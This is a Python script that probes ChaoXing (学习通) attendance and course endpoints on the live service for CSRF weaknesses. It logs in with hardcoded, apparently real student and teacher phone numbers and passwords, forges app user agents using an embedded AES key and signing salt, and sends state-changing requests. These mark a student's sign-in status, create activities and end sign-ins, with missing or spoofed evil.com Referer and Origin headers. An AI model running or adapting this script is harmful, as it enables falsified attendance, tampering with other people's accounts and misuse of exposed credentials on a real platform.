#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CSRF漏洞测试脚本 - 学习通签到与课程管理模块
测试目标: ChaoXing (超星学习通) 签到模块 & 课程管理模块的CSRF防护
"""

import base64, hashlib, json, uuid, requests, urllib3, time, sys
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

urllib3.disable_warnings()

# ============ 常量 ============
AES_KEY = b"u2oh6Vu^HWe4_AES"
SCHILD_SALT = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"
COURSE_ID = "257485372"
CLASS_ID = "132821141"
BASE = "https://mobilelearn.chaoxing.com"
MOOC_BASE = "https://mooc1-api.chaoxing.com"
MOOC1_BASE = "https://mooc1.chaoxing.com"

STUDENT_PHONE = "18436633997"
STUDENT_PWD = "3.1415926Cpy"
STUDENT_PUID = "431407443"

TEACHER_PHONE = "19712720708"
TEACHER_PWD = "3.1415926Cpy"
TEACHER_PUID = "402644510"

ACTIVE_ID = "5000163891319"

# ============ 工具函数 ============
def aes_enc(p):
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    return base64.b64encode(c.encrypt(pad(p.encode(), AES.block_size))).decode()

def schild_sign(model, locale, version, build, imei):
    parts = [f"(schild:{SCHILD_SALT})", f"(device:{model})", f"Language/{locale}",
             f"com.chaoxing.mobile/ChaoXingStudy_3_{version}_android_phone_{build}",
             f"(@Kalimdor)_{imei}"]
    return hashlib.md5(" ".join(parts).encode()).hexdigest()

def get_mobile_ua():
    imei = uuid.uuid4().hex[:32]
    sc = schild_sign("MI10", "zh_CN", "6.7.2", "10941_314", imei)
    return (f"Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 "
            f"(schild:{sc}) (device:MI10) Language/zh_CN "
            f"com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314 "
            f"(@Kalimdor)_{imei}")

def login(phone, pwd):
    s = requests.Session()
    s.verify = False
    ua = get_mobile_ua()
    s.headers.update({"User-Agent": ua, "Accept": "application/json, text/plain, */*", "Accept-Language": "zh_CN"})
    resp = s.post(LOGIN_URL, data={"fid": "-1", "uname": aes_enc(phone), "password": aes_enc(pwd),
                            "refer": "http%3A%2F%2Fi.mooc.chaoxing.com", "t": "true",
                            "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0",
                            "independentId": "0", "independentNameId": "0"},
           allow_redirects=False, timeout=30)
    puid = ""
    for c in s.cookies:
        if c.name in ("UID", "_uid"):
            puid = c.value
    try: s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except: pass
    try: s.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    except: pass
    return s, puid

# ============ CSRF测试核心 ============
results = []

def csrf_test(session, label, method, url, params=None, data=None, desc=""):
    """执行单个CSRF测试变体"""
    test_name = f"[{label}] {method} {desc}"
    try:
        if method == "GET":
            r = session.get(url, params=params, timeout=20, allow_redirects=False)
        elif method == "POST_NO_REFERER":
            headers = dict(session.headers)
            headers.pop("Referer", None)
            headers.pop("referer", None)
            r = session.post(url, data=data, params=params, timeout=20, allow_redirects=False,
                           headers=headers)
        elif method == "POST_EVIL_REFERER":
            headers = dict(session.headers)
            headers["Referer"] = "https://evil.com/"
            r = session.post(url, data=data, params=params, timeout=20, allow_redirects=False,
                           headers=headers)
        elif method == "POST_EVIL_ORIGIN":
            headers = dict(session.headers)
            headers["Origin"] = "https://evil.com"
            r = session.post(url, data=data, params=params, timeout=20, allow_redirects=False,
                           headers=headers)
        elif method == "POST_NO_XHR":
            headers = dict(session.headers)
            headers.pop("X-Requested-With", None)
            r = session.post(url, data=data, params=params, timeout=20, allow_redirects=False,
                           headers=headers)
        elif method == "POST_NORMAL":
            r = session.post(url, data=data, params=params, timeout=20, allow_redirects=False)
        else:
            print(f"  未知方法: {method}")
            return None

        status = r.status_code
        body = r.text[:200] if r.text else "(empty)"
        return {"status": status, "body": body, "test": test_name}
    except Exception as e:
        return {"status": "ERROR", "body": str(e)[:200], "test": test_name}

def classify_csrf(test_results):
    """根据测试结果分类CSRF防护等级"""
    success_count = 0
    for tr in test_results:
        if tr is None:
            continue
        body = tr.get("body", "")
        status = tr.get("status", 0)
        # 判断操作是否成功 - 根据常见响应模式
        if status == 200:
            try:
                j = json.loads(body)
                if j.get("result") == 1 or j.get("result") == True or j.get("status") == True:
                    success_count += 1
                elif "success" in body.lower() or "true" in body.lower():
                    success_count += 1
            except:
                if "success" in body.lower() or "true" in body.lower():
                    success_count += 1
        elif status == 302:
            # 重定向可能意味着操作被接受
            success_count += 1

    total = len([t for t in test_results if t is not None])
    if total == 0:
        return "UNKNOWN", 0
    ratio = success_count / total
    if ratio >= 0.5:
        return "NONE", success_count
    elif ratio > 0:
        return "PARTIAL", success_count
    else:
        return "FULL", 0

def print_result(tr):
    """打印单个测试结果"""
    if tr is None:
        print("    (无结果)")
        return
    print(f"    测试: {tr['test']}")
    print(f"    状态码: {tr['status']}")
    print(f"    响应体: {tr['body']}")
    print()

def run_csrf_suite(session, endpoint_label, url, get_params=None, post_data=None,
                   extra_get_params=None, extra_post_data=None, session_label=""):
    """运行完整CSRF测试套件"""
    print(f"\n{'='*70}")
    print(f"  测试端点: {endpoint_label}")
    print(f"  URL: {url}")
    print(f"  会话: {session_label}")
    print(f"{'='*70}")

    all_results = []

    # 1. GET请求
    gp = dict(get_params) if get_params else {}
    if extra_get_params:
        gp.update(extra_get_params)
    r1 = csrf_test(session, endpoint_label, "GET", url, params=gp, desc="GET请求")
    print_result(r1)
    all_results.append(r1)

    # 2. POST无Referer
    pd = dict(post_data) if post_data else {}
    if extra_post_data:
        pd.update(extra_post_data)
    r2 = csrf_test(session, endpoint_label, "POST_NO_REFERER", url, data=pd, desc="POST无Referer")
    print_result(r2)
    all_results.append(r2)

    # 3. POST跨域Referer
    r3 = csrf_test(session, endpoint_label, "POST_EVIL_REFERER", url, data=pd, desc="POST跨域Referer")
    print_result(r3)
    all_results.append(r3)

    # 4. POST跨域Origin
    r4 = csrf_test(session, endpoint_label, "POST_EVIL_ORIGIN", url, data=pd, desc="POST跨域Origin")
    print_result(r4)
    all_results.append(r4)

    # 5. POST无X-Requested-With
    r5 = csrf_test(session, endpoint_label, "POST_NO_XHR", url, data=pd, desc="POST无X-Requested-With")
    print_result(r5)
    all_results.append(r5)

    # 分类
    csrf_status, success_cnt = classify_csrf(all_results)
    marker = ""
    if csrf_status == "NONE":
        marker = "!!!CSRF!!!"
    elif csrf_status == "PARTIAL":
        marker = "***PARTIAL***"

    print(f"  >> CSRF防护等级: {csrf_status} {marker}")
    print(f"  >> 成功请求数: {success_cnt}/5")

    results.append({
        "module": endpoint_label.split("/")[0] if "/" in endpoint_label else endpoint_label,
        "endpoint": endpoint_label,
        "csrf_status": csrf_status,
        "success_count": success_cnt,
        "marker": marker,
        "details": all_results
    })

    return all_results

# ============ 主流程 ============
def main():
    print("=" * 70)
    print("  学习通CSRF漏洞测试 - 签到与课程管理模块")
    print("=" * 70)
    print()

    # 登录
    print("[*] 正在登录教师账号...")
    teacher_sess, teacher_puid = login(TEACHER_PHONE, TEACHER_PWD)
    print(f"    教师PUID: {teacher_puid}")
    if not teacher_puid:
        print("    [!] 教师登录可能失败，继续尝试...")

    print("[*] 正在登录学生账号...")
    student_sess, student_puid = login(STUDENT_PHONE, STUDENT_PWD)
    print(f"    学生PUID: {student_puid}")
    if not student_puid:
        print("    [!] 学生登录可能失败，继续尝试...")

    time.sleep(1)

    # ================================================================
    # Part 1: 签到模块CSRF测试
    # ================================================================
    print("\n" + "#" * 70)
    print("#  Part 1: 签到模块 CSRF 测试")
    print("#" * 70)

    # --- 1.1 updateSignStatusByUidsV2 ---
    print("\n" + "-" * 70)
    print("  1.1 /pptSign/updateSignStatusByUidsV2 (已知CSRF漏洞)")
    print("-" * 70)

    # 先查询当前签到状态
    print("[*] 查询当前签到状态...")
    try:
        check_url = f"{BASE}/pptSign/getSignDetailV2"
        check_params = {"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId",
                       "activeId": ACTIVE_ID, "uid": STUDENT_PUID}
        check_r = teacher_sess.get(check_url, params=check_params, timeout=20)
        print(f"    当前状态: {check_r.status_code} - {check_r.text[:200]}")
    except Exception as e:
        print(f"    查询失败: {e}")

    url_1_1 = f"{BASE}/pptSign/updateSignStatusByUidsV2"
    params_1_1 = {
        "DB_STRATEGY": "PRIMARY_KEY",
        "STRATEGY_PARA": "activeId",
        "activeId": ACTIVE_ID,
        "uids": STUDENT_PUID,
        "status": "1",
        "remark": ""
    }
    run_csrf_suite(teacher_sess, "1.1/pptSign/updateSignStatusByUidsV2",
                   url_1_1, get_params=params_1_1, post_data=params_1_1,
                   session_label="教师")

    # 验证数据修改
    print("[*] 验证签到状态是否被修改...")
    try:
        check_r2 = teacher_sess.get(check_url, params=check_params, timeout=20)
        print(f"    修改后状态: {check_r2.status_code} - {check_r2.text[:200]}")
    except Exception as e:
        print(f"    验证失败: {e}")

    time.sleep(1)

    # --- 1.2 stuSignajax ---
    print("\n" + "-" * 70)
    print("  1.2 /pptSign/stuSignajax (学生签到)")
    print("-" * 70)

    url_1_2 = f"{BASE}/pptSign/stuSignajax"
    params_1_2 = {
        "activeId": ACTIVE_ID,
        "uid": STUDENT_PUID,
        "clientip": "",
        "useragent": "",
        "latitude": "-1",
        "longitude": "-1",
        "appType": "15",
        "fid": "",
        "name": ""
    }
    run_csrf_suite(student_sess, "1.2/pptSign/stuSignajax",
                   url_1_2, get_params=params_1_2, post_data=params_1_2,
                   session_label="学生")

    time.sleep(1)

    # --- 1.3 createActive ---
    print("\n" + "-" * 70)
    print("  1.3 /ppt/activeAPI/createActive (创建活动)")
    print("-" * 70)

    url_1_3 = f"{BASE}/ppt/activeAPI/createActive"
    params_1_3 = {
        "courseId": COURSE_ID,
        "classId": CLASS_ID,
        "activeType": "2",
        "title": "CSRF_TEST"
    }
    run_csrf_suite(teacher_sess, "1.3/ppt/activeAPI/createActive",
                   url_1_3, get_params=params_1_3, post_data=params_1_3,
                   session_label="教师")

    time.sleep(1)

    # --- 1.4 endSign ---
    print("\n" + "-" * 70)
    print("  1.4 /ppt/activeAPI/endSign (结束签到)")
    print("-" * 70)

    url_1_4 = f"{BASE}/ppt/activeAPI/endSign"
    params_1_4 = {
        "activeId": ACTIVE_ID
    }
    run_csrf_suite(teacher_sess, "1.4/ppt/activeAPI/endSign",
                   url_1_4, get_params=params_1_4, post_data=params_1_4,
                   session_label="教师")

    time.sleep(1)

    # --- 1.5 updateSignStatus ---
    print("\n" + "-" * 70)
    print("  1.5 /newsign/updateSignStatus (更新签到状态)")
    print("-" * 70)

    url_1_5 = f"{BASE}/newsign/updateSignStatus"
    params_1_5 = {
        "activeId": ACTIVE_ID,
        "status": "1",
        "uid": STUDENT_PUID,
        "courseId": COURSE_ID,
        "classId": CLASS_ID
    }
    run_csrf_suite(student_sess, "1.5/newsign/updateSignStatus",
                   url_1_5, get_params=params_1_5, post_data=params_1_5,
                   session_label="学生")

    time.sleep(1)

    # ================================================================
    # Part 2: 课程管理模块CSRF测试
    # ================================================================
    print("\n" + "#" * 70)
    print("#  Part 2: 课程管理模块 CSRF 测试")
    print("#" * 70)

    # --- 2.1 studentstudyAjax ---
    print("\n" + "-" * 70)
    print("  2.1 /mooc-ans/mycourse/studentstudyAjax")
    print("-" * 70)

    url_2_1 = f"{MOOC_BASE}/mooc-ans/mycourse/studentstudyAjax"
    params_2_1 = {
        "courseId": COURSE_ID,
        "clazzid": CLASS_ID,
        "chapterId": "1",
        "cpi": "0"
    }
    run_csrf_suite(student_sess, "2.1/mooc-ans/mycourse/studentstudyAjax",
                   url_2_1, get_params=params_2_1, post_data=params_2_1,
                   session_label="学生")

    time.sleep(1)

    # --- 2.2 myjobsnodesmap ---
    print("\n" + "-" * 70)
    print("  2.2 /job/myjobsnodesmap")
    print("-" * 70)

    url_2_2 = f"{MOOC_BASE}/job/myjobsnodesmap"
    data_2_2 = {
        "nodes": "1",
        "clazzid": CLASS_ID,
        "userid": STUDENT_PUID,
        "cpi": "0",
        "courseid": COURSE_ID
    }
    run_csrf_suite(student_sess, "2.2/job/myjobsnodesmap",
                   url_2_2, post_data=data_2_2,
                   session_label="学生")

    time.sleep(1)

    # --- 2.3 其他 mooc1-api 端点 ---
    print("\n" + '-' * 70)
    print("  2.3 探索其他 /mooc1-api.chaoxing.com/mooc-ans/ 端点")
    print("-" * 70)

    explore_endpoints_api = [
        ("/mooc-ans/mycourse/backclazzdata", {"view": "json", "m": "0"}),
        ("/mooc-ans/mycourse/stucourse", {"courseId": COURSE_ID, "clazzid": CLASS_ID}),
        ("/mooc-ans/knowledge/startface", {"courseId": COURSE_ID, "clazzid": CLASS_ID, "chapterId": "1"}),
        ("/mooc-ans/knowledge/uploadInfo", {"courseId": COURSE_ID, "clazzid": CLASS_ID}),
        ("/mooc-ans/facephoto/continuelearn", {"courseId": COURSE_ID, "clazzid": CLASS_ID, "chapterId": "1"}),
        ("/mooc-ans/facephoto/clientfacecheckstatus", {"courseId": COURSE_ID, "clazzid": CLASS_ID}),
    ]

    for path, params in explore_endpoints_api:
        url = f"{MOOC_BASE}{path}"
        label = f"2.3{path}"
        print(f"\n  >> 测试: {path}")
        run_csrf_suite(student_sess, label, url,
                       get_params=params, post_data=params,
                       session_label="学生")
        time.sleep(0.5)

    # --- 2.4 mooc1.chaoxing.com 端点 ---
    print("\n" + '-' * 70)
    print("  2.4 探索 /mooc1.chaoxing.com/mooc-ans/ 端点")
    print("-" * 70)

    explore_endpoints_mooc1 = [
        ("/mooc-ans/mycourse/studentstudy", {"courseId": COURSE_ID, "clazzid": CLASS_ID, "chapterId": "1", "cpi": "0"}),
        ("/mooc-ans/mycourse/studentstudyAjax", {"courseId": COURSE_ID, "clazzid": CLASS_ID, "chapterId": "1", "cpi": "0"}),
        ("/mooc-ans/visit/stucoursemiddle", {"courseId": COURSE_ID, "clazzid": CLASS_ID, "cpi": "0"}),
    ]

    for path, params in explore_endpoints_mooc1:
        url = f"{MOOC1_BASE}{path}"
        label = f"2.4{path}"
        print(f"\n  >> 测试: {path}")
        run_csrf_suite(student_sess, label, url,
                       get_params=params, post_data=params,
                       session_label="学生")
        time.sleep(0.5)

    # ================================================================
    # 汇总报告
    # ================================================================
    print("\n" + "=" * 70)
    print("  CSRF漏洞测试汇总报告")
    print("=" * 70)

    print(f"\n{'模块':<20} {'端点':<50} {'CSRF状态':<12} {'成功数':<8} {'标记'}")
    print("-" * 100)
    for r in results:
        marker = r["marker"]
        print(f"{r['module']:<20} {r['endpoint']:<50} {r['csrf_status']:<12} {r['success_count']}/5       {marker}")

    # 统计
    none_count = sum(1 for r in results if r["csrf_status"] == "NONE")
    partial_count = sum(1 for r in results if r["csrf_status"] == "PARTIAL")
    full_count = sum(1 for r in results if r["csrf_status"] == "FULL")
    unknown_count = sum(1 for r in results if r["csrf_status"] == "UNKNOWN")

    print(f"\n统计:")
    print(f"  无CSRF防护 (NONE):   {none_count} 个端点 !!!CSRF!!!")
    print(f"  部分防护 (PARTIAL):  {partial_count} 个端点 ***PARTIAL***")
    print(f"  完全防护 (FULL):     {full_count} 个端点")
    print(f"  未知 (UNKNOWN):      {unknown_count} 个端点")

    # 详细标记表
    print("\n" + "=" * 70)
    print("  详细CSRF状态表")
    print("=" * 70)
    print(f"\n| 模块 | 端点 | 方法 | CSRF状态 | 备注 |")
    print(f"|------|------|------|----------|------|")
    for r in results:
        methods_tested = "GET/POST"
        notes = ""
        if r["csrf_status"] == "NONE":
            notes = "CSRF攻击可成功,无防护"
        elif r["csrf_status"] == "PARTIAL":
            notes = "部分请求可绕过CSRF"
        elif r["csrf_status"] == "FULL":
            notes = "CSRF防护有效"
        else:
            notes = "无法确定"
        print(f"| {r['module'][:18]} | {r['endpoint'][:48]} | {methods_tested} | {r['csrf_status']} | {notes} |")

    print("\n[+] 测试完成!")

if __name__ == "__main__":
    main()
